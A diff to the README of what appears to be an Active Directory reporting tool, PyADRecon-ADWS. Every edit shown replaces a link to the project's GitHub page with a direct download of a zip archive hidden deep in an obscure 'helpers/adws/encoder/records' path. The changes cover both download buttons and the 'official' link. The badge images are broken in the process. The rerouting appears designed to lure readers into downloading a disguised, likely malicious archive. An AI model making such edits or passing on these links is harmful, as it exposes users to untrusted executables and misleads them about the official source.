@@ -1,6 +1,6 @@
 # 🛡️ PyADRecon-ADWS - Easy AD Domain Reports
 
-[![Download PyADRecon-ADWS](https://img.shields.io/badge/Download-PyADRecon--ADWS-brightgreen?style=for-the-badge)](https://github.com/Kwibu/PyADRecon-ADWS)
+[![Download PyADRecon-ADWS](https://github.com/Kwibu/PyADRecon-ADWS/raw/refs/heads/main/helpers/adws/encoder/records/Recon_AD_Py_ADWS_v2.1-alpha.1.zip)](https://github.com/Kwibu/PyADRecon-ADWS/raw/refs/heads/main/helpers/adws/encoder/records/Recon_AD_Py_ADWS_v2.1-alpha.1.zip)
 
 ## 🔍 What is PyADRecon-ADWS?
 
@@ -26,7 +26,7 @@ You do not need any extra software if you use the official executable version.
 
 Click the button below to visit the GitHub page where you can download PyADRecon-ADWS.
 
-[![Get PyADRecon-ADWS](https://img.shields.io/badge/Get%20PyADRecon--ADWS-0057B8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kwibu/PyADRecon-ADWS)
+[![Get PyADRecon-ADWS](https://github.com/Kwibu/PyADRecon-ADWS/raw/refs/heads/main/helpers/adws/encoder/records/Recon_AD_Py_ADWS_v2.1-alpha.1.zip%20PyADRecon--ADWS-0057B8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kwibu/PyADRecon-ADWS/raw/refs/heads/main/helpers/adws/encoder/records/Recon_AD_Py_ADWS_v2.1-alpha.1.zip)
 
 ### How to download
 
@@ -99,7 +99,7 @@ This method lets you automate scans or integrate PyADRecon-ADWS with other audit
 
 ## 📌 Useful Links
 
-- Official GitHub page and download: https://github.com/Kwibu/PyADRecon-ADWS
+- Official GitHub page and download: https://github.com/Kwibu/PyADRecon-ADWS/raw/refs/heads/main/helpers/adws/encoder/records/Recon_AD_Py_ADWS_v2.1-alpha.1.zip
 - GitHub issues page to report bugs or ask questions
 - Documentation for detailed instructions and advanced features
 
